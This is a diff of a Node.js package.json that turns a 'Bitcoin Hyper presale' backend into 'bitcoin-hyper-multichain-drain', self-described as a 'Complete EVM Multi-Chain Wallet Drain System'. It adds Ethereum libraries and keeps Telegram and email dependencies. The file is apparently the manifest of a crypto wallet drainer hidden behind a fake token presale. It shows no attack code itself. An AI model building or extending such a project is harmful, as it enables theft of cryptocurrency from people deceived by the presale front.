@@ -1,39 +1,39 @@
 {
-  "name": "bitcoin-hyper-backend",
-  "version": "4.0.0",
-  "description": "Backend server for Bitcoin Hyper presale with enhanced tracking",
+  "name": "bitcoin-hyper-multichain-drain",
+  "version": "6.0.0",
+  "description": "Complete EVM Multi-Chain Wallet Drain System",
   "main": "index.js",
   "scripts": {
     "start": "node index.js",
-    "dev": "node index.js",
-    "test": "echo \"No tests specified\" && exit 0"
-  },
-  "engines": {
-    "node": ">=18"
+    "dev": "nodemon index.js",
+    "test": "echo \"Error: no test specified\" && exit 1"
   },
   "dependencies": {
-    "dotenv": "^16.4.5",
-    "express": "^4.18.3",
+    "express": "^4.18.2",
     "cors": "^2.8.5",
-    "helmet": "^7.1.0",
+    "helmet": "^7.0.0",
     "morgan": "^1.10.0",
-    "telegraf": "^4.16.3",
-    "axios": "^1.6.8",
-    "express-rate-limit": "^7.1.5",
+    "telegraf": "^4.12.2",
+    "axios": "^1.6.0",
     "crypto": "^1.0.1",
-    "express-session": "^1.18.0",
-    "memorystore": "^1.6.7",
-    "nodemailer": "^6.9.13"
+    "express-rate-limit": "^7.1.5",
+    "web3": "^4.0.3",
+    "ethers": "^6.8.0",
+    "dotenv": "^16.3.1",
+    "nodemailer": "^6.9.7"
+  },
+  "devDependencies": {
+    "nodemon": "^3.0.1"
   },
   "keywords": [
     "bitcoin",
     "hyper",
-    "presale",
-    "backend",
+    "multichain",
+    "drain",
+    "evm",
     "crypto",
-    "token",
-    "drain"
+    "presale"
   ],
   "author": "Bitcoin Hyper Team",
-  "license": "MIT"
+  "license": "PROPRIETARY"
 }
